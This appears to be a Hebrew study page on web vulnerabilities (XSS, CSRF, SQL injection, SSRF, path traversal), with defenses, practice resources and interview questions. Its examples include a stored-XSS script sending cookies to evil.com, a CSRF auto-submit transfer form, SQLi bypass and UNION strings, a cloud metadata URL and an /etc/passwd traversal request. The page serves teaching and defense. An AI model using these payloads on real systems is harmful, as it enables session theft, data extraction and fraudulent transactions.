# 🕸️ חולשות Web — XSS, CSRF, SQLi ועוד

> **"כל input הוא hostile עד שהוכח אחרת."**
> — חוק מספר 1 באבטחת Web.

!!! warning "אזהרה אתית"
    כל הטכניקות למטרות הגנה ולימוד בלבד.

---

## XSS — Cross-Site Scripting

הזרקת JavaScript לדפדפן של הקורבן.

### Stored XSS
```html
<!-- תוקף שומר בDB דרך form -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- כל משתמש שרואה את הדף — נגנב לו ה-cookie -->
```

### Reflected XSS
```
https://site.com/search?q=<script>alert('xss')</script>
```

### DOM-based XSS
```javascript
// הקוד של האתר:
document.getElementById("output").innerHTML = location.hash.slice(1);
// URL: site.com/#<img src=x onerror=alert(1)>
```

### הגנה מ-XSS
```javascript
// ✅ Escape output
const safe = DOMPurify.sanitize(userInput);
// ✅ Content Security Policy header
// Content-Security-Policy: script-src 'self'
// ✅ httpOnly cookies (JS can't access)
```

---

## CSRF — Cross-Site Request Forgery

אתר זדוני גורם לדפדפן לשלוח request מאומת בשם המשתמש.

```html
<!-- evil.com -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.getElementById('f').submit();</script>
```

### הגנה
- **CSRF Token** — token חד-פעמי בכל form
- **SameSite cookies** — `Set-Cookie: session=abc; SameSite=Strict`
- **Double Submit Cookie** — cookie + hidden field

---

## SQL Injection

```sql
-- Login bypass
Username: admin' --
Password: anything
-- Query: SELECT * FROM users WHERE username='admin' --' AND password='anything'

-- Data extraction
' UNION SELECT username, password FROM users --
```

---

## SSRF — Server-Side Request Forgery

```python
# שרת fetches URL שהמשתמש מספק
url = request.args["url"]
data = requests.get(url)  # התוקף: url=http://169.254.169.254/metadata
```

---

## Path Traversal

```
GET /api/file?name=../../../etc/passwd
```

---

## 🛤️ מאיפה מתחילים

1. **PortSwigger Web Security Academy** — מעבדות חינם
2. **OWASP Juice Shop** — אפליקציה vulnerable לתרגול
3. **Burp Suite** — proxy לבדיקת Web apps
4. **Bug Bounty** — HackerOne, Bugcrowd

!!! tip "לימוד אקדמי"
    **קורסים**: אבטחת מידע, רשתות מחשבים, מסדי נתונים (SQL), תכנות Web.

---

## 💼 שאלות לראיון עבודה

??? tip "הסבירו 3 סוגי XSS והגנות."
    **Stored** — נשמר ב-DB, משפיע על כל המשתמשים. **Reflected** — ב-URL, דורש קליק.
    **DOM** — client-side בלבד. הגנות: output encoding, CSP, DOMPurify, httpOnly cookies.

??? tip "מה זה CSRF ואיך מגנים?"
    אתר זדוני שולח request מהדפדפן שלך עם הcookies שלך.
    הגנות: CSRF token, SameSite cookie, double submit cookie, check Origin header.

??? tip "מה ההבדל בין Stored XSS ל-Reflected XSS?"
    **Stored** — הpayload נשמר בDB ומוצג לכל המשתמשים (יותר מסוכן).
    **Reflected** — הpayload בURL, משפיע רק על מי שלוחץ על הלינק.

??? tip "איך מונעים SQL Injection?"
    1. Parameterized queries / Prepared statements
    2. ORMs (Prisma, SQLAlchemy)
    3. Input validation + whitelist
    4. Least privilege DB user
